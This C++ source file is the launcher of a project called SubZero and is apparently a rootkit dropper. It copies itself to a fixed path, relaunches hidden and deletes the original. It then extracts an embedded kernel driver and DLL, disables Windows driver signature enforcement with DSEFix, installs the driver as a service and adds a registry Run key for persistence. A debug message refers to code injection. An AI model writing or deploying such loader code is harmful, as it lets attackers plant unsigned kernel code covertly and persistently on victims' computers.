#include "resource.h"
#include "SubZeroLauncherCommon.h"
#include "../SubZeroDriver/SubZeroCommon.h"
#include "../SubZeroUtils/AutoRegistryKeyHandle.h"
#include "../SubZeroUtils/PeResource.h"
#include "../SubZeroUtils/ServiceManager.h"
#include "../SubZeroUtils/RegistryManager.h"
#include "../SubZeroUtils/DebugPrint.h"
#include "../SubZeroUtils/AutoHandle.h"
#include "../SubZeroCleanup/SubZeroCleanup.h"

extern "C" {
#include "../DSEFix/DSEFix.h"
}

#include <filesystem>

namespace fs = std::filesystem;

const std::wstring DRIVER_RESOURCE_NAME(L"PUXY");
const std::wstring DLL_RESOURCE_NAME(L"NKUI");

int wmain(int argc, wchar_t* argv[])
{
	if (0 != ::wcscmp(argv[0], LAUNCHER_FULL_PATH.c_str()))
	{
		// Copy to desired directory
		fs::copy(argv[0], LAUNCHER_FULL_PATH.c_str());
		
		STARTUPINFO si;
		PROCESS_INFORMATION pi;

		::ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		::ZeroMemory(&pi, sizeof(pi));

		const std::wstring args(LAUNCHER_FULL_PATH + L" \"" + argv[0] + L"\"");
		
		// Execute the program copy
		if (!::CreateProcessW(
			nullptr,							// Module
			const_cast<LPWSTR>(args.c_str()),	// Command-line
			nullptr,							// Process security attributes
			nullptr,                			// Primary thread security attributes
			TRUE,								// Handles are inherited
			CREATE_NO_WINDOW,					// Creation flags
			nullptr,							// Environment (use parent)
			nullptr,							// Current directory (use parent)
			&si,								// STARTUPINFO pointer
			&pi))								// PROCESS_INFORMATION pointer             
		{
			DEBUG_PRINT("[-] Error finding target PIC injection process");
		}

		::CloseHandle(pi.hProcess);
		::CloseHandle(pi.hThread);

		::ExitProcess(1);
	}
	
	if (0 < argc)
	{
		// Executed by a copy, delete it
		if (!::DeleteFileW(argv[1]))					
			DEBUG_PRINT("[-] Error deleting driver file. Error code: (0x%08X)", ::GetLastError());		
	}

	// Save resources to file system
	try {
		const PeResource driverResource(IDR_PUXY1, DRIVER_RESOURCE_NAME);
		driverResource.saveResourceToFileSystem(DRIVER_FULL_PATH);
		DEBUG_PRINT("[+] Driver extracted and saved to file system successfully");
	}
	catch (const Win32ErrorCodeException& exception) {				
		if (ERROR_FILE_EXISTS != exception.getErrorCode()) 
		{
			// Error extracting/saving resource
			DEBUG_PRINT(exception.what());
			SubZeroCleanup::Cleanup();
			return 1;
		}
	}

	 try {
		const PeResource libraryResource(IDR_NKUI1, DLL_RESOURCE_NAME);
		libraryResource.saveResourceToFileSystem(DLL_FULL_PATH);
		DEBUG_PRINT("[+] DLL extracted and saved to file system successfully");
	}
	catch (const Win32ErrorCodeException& exception) {
		if (ERROR_FILE_EXISTS != exception.getErrorCode()) 
		{
			// Error extracting/saving resource
			DEBUG_PRINT(exception.what());
			SubZeroCleanup::Cleanup();
			return 1;
		}
	}

	// Disable DSE protection using DSEFix
	DSEFixMain();
	DEBUG_PRINT("[+] DSE protection disabled");

	// Load driver
	try {
		ServiceManager serviceManager(DRIVER_NAMEW, DRIVER_FULL_PATH, SERVICE_KERNEL_DRIVER);
		serviceManager.installAndStart();
		
		DEBUG_PRINT("[+] Driver installed and started successfully");
	}
	catch (const Win32ErrorCodeException& exception) {
		DEBUG_PRINT(exception.what());
		SubZeroCleanup::Cleanup();
		return 1;
	}

	try {
		AutoRegistryKeyHandle AutoRegKey(RegistryManager::OpenRegistryKey(REG_SZ_KEY_ROOT, REG_RUN_KEY_PATH));
		RegistryManager::SetRegistryValue(AutoRegKey.get(), REG_VALUE_NAME, REG_SZ, 
			(PVOID)LAUNCHER_FULL_PATH.c_str(), LAUNCHER_FULL_PATH.length() * sizeof(WCHAR));
		
		DEBUG_PRINT("[+] Successfully Added as RUN value");
	}
	catch (const Win32ErrorCodeException& exception) {
		SubZeroCleanup::Cleanup();
		DEBUG_PRINT(exception.what());
	}
	return 0;
}